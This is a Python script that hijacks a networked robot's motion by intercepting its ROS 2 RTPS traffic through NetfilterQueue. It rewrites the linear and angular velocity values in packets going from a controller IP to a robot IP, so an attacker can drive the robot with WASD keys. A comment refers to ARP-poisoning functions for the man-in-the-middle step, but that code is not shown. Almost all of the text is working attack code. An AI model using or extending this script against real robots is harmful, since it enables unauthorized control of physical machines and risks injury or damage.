from scapy.all import *
from netfilterqueue import NetfilterQueue
from pynput import keyboard
import threading
import time
import struct
import subprocess

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

target_linear  = 0.0
target_angular = 0.0

# --- KEYBOARD LISTENER (Requires DISPLAY) ---
def on_press(key):
    global target_linear, target_angular
    print(f"[DEBUG] Key Pressed: {key}")
    try:
        if key.char == 'w': target_linear = 0.6
        elif key.char == 's': target_linear = -0.6
        elif key.char == 'a': target_angular = 1.2
        elif key.char == 'd': target_angular = -1.2
    except AttributeError:
        if key == keyboard.Key.space:
            target_linear = 0.0
            target_angular = 0.0

def on_release(key):
    global target_linear, target_angular
    # When you let go of a key, stop that specific movement
    try:
        if key.char in ['w', 's']: target_linear = 0.0
        if key.char in ['a', 'd']: target_angular = 0.0
    except AttributeError:
        pass

# Start listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# --- PACKET PROCESSING ---
def process_packet(packet):
    global target_linear, target_angular
    try:
        scapy_pkt = IP(packet.get_payload())
        
        if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
            raw_data = scapy_pkt[Raw].load
            
            # Check for the RTPS Magic Header first
            if raw_data.startswith(b'RTPS'):
                marker = b'\x15\x05'
                marker_pos = raw_data.find(marker)
                
                if marker_pos == -1:
                    print("[?] RTPS Packet found, but no '15 05' Data marker. Skipping...")
                else:
                    lin_x_offset = marker_pos + 28
                    # DIAGNOSTIC: Print the 8 bytes we ARE about to overwrite
                    current_hex = raw_data[lin_x_offset:lin_x_offset+8].hex()
                    print(f"[*] Found Marker at {marker_pos}. Target Hex: {current_hex}")

                    if len(raw_data) >= lin_x_offset + 8:
                        # Perform the injection
                        new_payload = (
                            raw_data[:lin_x_offset] + 
                            struct.pack('<d', target_linear) + 
                            raw_data[lin_x_offset+8:marker_pos+68] + # Jump to Angular
                            struct.pack('<d', target_angular) + 
                            raw_data[marker_pos+76:]
                        )
                        scapy_pkt[Raw].load = new_payload
                        
                        # Recalculate everything
                        del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                        del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
                        
                        packet.set_payload(bytes(scapy_pkt))
                        # print(f"Successfully Injected: {target_linear}")

    except Exception as e:
        print(f"[!] Packet Error: {e}")

    packet.accept()
# [Standard get_mac and arp_poison_thread functions here]

if __name__ == "__main__":
    # ... (Discovery and Thread startup same as before)
    nfqueue = NetfilterQueue()
    nfqueue.bind(queue_number, process_packet)
    print("[*] WASD Mode Active. Focus the terminal window to drive.")
    nfqueue.run()